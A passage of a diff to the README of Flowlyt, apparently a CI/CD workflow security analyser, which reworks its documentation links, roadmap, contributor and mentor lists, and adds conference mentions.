+|-------|-------------|
+| [Quick Start](docs/quick-start.md) | Installation and basic usage |
+| [Features](docs/features.md) | Complete feature overview |
+| [AST Analysis](docs/ast-analysis.md) | Advanced static analysis capabilities |
+| [Configuration](docs/configuration.md) | Detailed configuration guide |
+| [Security Rules](docs/security-rules.md) | Complete rule reference |
+| [Custom Rules](docs/custom-rules.md) | Creating custom security rules |
+| [CLI Reference](docs/cli-reference.md) | Command-line options |
 
 ## 🚀 Roadmap
 
-- [x] **SARIF Output**: Support for SARIF format for better tool integration
-- [x] **AST-Based Analysis**: Advanced static analysis with call graph and reachability analysis
-- [x] **Multi-Platform Support**: GitHub Actions and GitLab CI support
-- [x] **Data Flow Analysis**: Track sensitive data movement through workflows
-- [x] **Call Graph Analysis**: Build dependency graphs of workflow components
-- [x] **Reachability Analysis**: Filter findings in unreachable code paths
-- [ ] **Workflow Visualization**: Visual workflow security analysis dashboard
-- [ ] **Plugin System**: Extensible plugin architecture for custom rules
-- [ ] **IDE Integration**: VS Code extension for real-time analysis
-- [ ] **Advanced Analytics**: Security trend analysis and reporting dashboard
-- [ ] **Enterprise Features**: SSO, RBAC, and compliance reporting
+- [x] **SARIF Output** - GitHub Security tab integration
+- [x] **AST Analysis** - Call graph, reachability, data flow
+- [x] **Multi-Platform** - GitHub Actions + GitLab CI/CD
+- [ ] **IDE Extension** - VS Code real-time analysis
+- [ ] **Workflow Visualization** - Security dependency graphs
+- [ ] **Enterprise Features** - SSO, RBAC, compliance reporting
+
+## 🤝 Contributing
+
+We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
+MIT License - see [LICENSE](LICENSE) for details.
 
 ---
 
+**Conference Presentations:**
+- 🎯 [DEF CON 33 - AppSec Village](https://defcon.org) (Presented)
+- 🔥 [Black Hat Europe 2025](https://blackhat.com) (Upcoming)
+
+<a href="https://github.com/harekrishnarai/flowlyt/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=harekrishnarai/flowlyt" />
+</a>
+
 ## Contributors
 Thanks to all the people who already contributed!   
-[Prashant Venkatesh](https://www.linkedin.com/in/prashant-venkatesh-99018999/)    
-[Nandan Gupta](https://www.linkedin.com/in/nandan-gupta-698aa11b)  
-[Mohd. Arif](https://www.linkedin.com/in/mohd--arif/) 
 [Hare Krishna Rai](https://www.linkedin.com/in/harekrishnarai/)  
 [Gaurav Joshi](https://www.linkedin.com/in/gauravjoshii/)  
 [Chanchal Kalnarayan](https://www.linkedin.com/in/ckalnarayan) 
+
+## Mentors
+[Prashant Venkatesh](https://www.linkedin.com/in/prashant-venkatesh-99018999/)    
+[Nandan Gupta](https://www.linkedin.com/in/nandan-gupta-698aa11b)  
+[Mohd. Arif](https://www.linkedin.com/in/mohd--arif/)  
 
 <a href="https://github.com/harekrishnarai/flowlyt/graphs/contributors">
   <img src="https://contrib.rocks/image?repo=harekrishnarai/flowlyt" />
